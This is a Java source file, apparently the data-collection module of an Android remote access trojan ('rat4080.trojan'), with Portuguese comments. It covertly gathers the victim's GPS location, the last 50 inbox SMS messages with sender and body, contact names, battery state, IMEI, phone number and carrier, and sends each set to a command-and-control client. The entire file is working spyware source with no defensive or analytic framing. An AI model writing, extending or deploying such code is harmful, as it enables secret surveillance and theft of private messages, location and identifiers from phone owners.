package com.rat4080.trojan;

import android.content.*;
import android.location.*;
import android.net.wifi.WifiManager;
import android.os.*;
import android.provider.*;
import android.telephony.*;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.*;

/**
 * Recolhe dados do dispositivo e envia para o C2
 */
public class DataCollector {
    
    private static final String TAG = "Rat4080Data";
    
    private Context context;
    private String deviceId;
    private C2Client c2Client;
    
    public DataCollector(Context context, String deviceId) {
        this.context = context;
        this.deviceId = deviceId;
    }
    
    public void setC2Client(C2Client c2Client) {
        this.c2Client = c2Client;
    }
    
    public void collectLocation() {
        try {
            LocationManager locationManager = (LocationManager)
                context.getSystemService(Context.LOCATION_SERVICE);
            
            Location lastKnown = locationManager.getLastKnownLocation(
                LocationManager.GPS_PROVIDER
            );
            
            if (lastKnown == null) {
                lastKnown = locationManager.getLastKnownLocation(
                    LocationManager.NETWORK_PROVIDER
                );
            }
            
            if (lastKnown != null && c2Client != null) {
                JSONObject locationData = new JSONObject();
                locationData.put("latitude", lastKnown.getLatitude());
                locationData.put("longitude", lastKnown.getLongitude());
                locationData.put("accuracy", lastKnown.getAccuracy());
                locationData.put("timestamp", lastKnown.getTime());
                
                c2Client.sendData("location", locationData);
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro na localização: " + e.getMessage());
        }
    }
    
    public void collectSms() {
        try {
            JSONArray smsList = new JSONArray();
            Cursor cursor = context.getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                null, null, null, "date DESC LIMIT 50"
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject sms = new JSONObject();
                    sms.put("address", cursor.getString(
                        cursor.getColumnIndexOrThrow("address")
                    ));
                    sms.put("body", cursor.getString(
                        cursor.getColumnIndexOrThrow("body")
                    ));
                    sms.put("date", cursor.getString(
                        cursor.getColumnIndexOrThrow("date")
                    ));
                    smsList.put(sms);
                }
                cursor.close();
            }
            
            if (c2Client != null && smsList.length() > 0) {
                c2Client.sendData("sms", smsList);
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro nas SMS: " + e.getMessage());
        }
    }
    
    public void collectContacts() {
        try {
            JSONArray contactList = new JSONArray();
            Cursor cursor = context.getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String contactId = cursor.getString(
                        cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID)
                    );
                    String name = cursor.getString(
                        cursor.getColumnIndexOrThrow(
                            ContactsContract.Contacts.DISPLAY_NAME
                        )
                    );
                    
                    JSONObject contact = new JSONObject();
                    contact.put("name", name);
                    contactList.put(contact);
                }
                cursor.close();
            }
            
            if (c2Client != null && contactList.length() > 0) {
                c2Client.sendData("contacts", contactList);
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro nos contactos: " + e.getMessage());
        }
    }
    
    public void collectBatteryLevel() {
        try {
            IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = context.registerReceiver(null, filter);
            
            if (batteryStatus != null && c2Client != null) {
                int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                int percentage = (int) ((level / (float) scale) * 100);
                
                JSONObject batteryData = new JSONObject();
                batteryData.put("level", percentage);
                batteryData.put("charging", batteryStatus.getIntExtra(
                    BatteryManager.EXTRA_STATUS, -1
                ) == BatteryManager.BATTERY_STATUS_CHARGING);
                
                c2Client.sendData("battery", batteryData);
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro na bateria: " + e.getMessage());
        }
    }
    
    public void collectDeviceInfo() {
        try {
            if (c2Client != null) {
                JSONObject deviceInfo = new JSONObject();
                deviceInfo.put("model", Build.MODEL);
                deviceInfo.put("manufacturer", Build.MANUFACTURER);
                deviceInfo.put("brand", Build.BRAND);
                deviceInfo.put("device", Build.DEVICE);
                deviceInfo.put("hardware", Build.HARDWARE);
                deviceInfo.put("android_version", Build.VERSION.RELEASE);
                deviceInfo.put("sdk_version", Build.VERSION.SDK_INT);
                deviceInfo.put("build_fingerprint", Build.FINGERPRINT);
                deviceInfo.put("imei", getImei());
                deviceInfo.put("phone_number", getPhoneNumber());
                deviceInfo.put("carrier", getCarrierName());
                deviceInfo.put("language", Locale.getDefault().getLanguage());
                
                c2Client.sendData("device_info", deviceInfo);
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro na info do dispositivo: " + e.getMessage());
        }
    }
    
    private String getImei() {
        try {
            TelephonyManager telephonyManager = (TelephonyManager)
                context.getSystemService(Context.TELEPHONY_SERVICE);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                return telephonyManager.getImei();
            } else {
                return telephonyManager.getDeviceId();
            }
        } catch (Exception e) {
            return "Não disponível";
        }
    }
    
    private String getPhoneNumber() {
        try {
            TelephonyManager telephonyManager = (TelephonyManager)
                context.getSystemService(Context.TELEPHONY_SERVICE);
            return telephonyManager.getLine1Number();
        } catch (Exception e) {
            return "Não disponível";
        }
    }
    
    private String getCarrierName() {
        try {
            TelephonyManager telephonyManager = (TelephonyManager)
                context.getSystemService(Context.TELEPHONY_SERVICE);
            return telephonyManager.getNetworkOperatorName();
        } catch (Exception e) {
            return "Não disponível";
        }
    }
}
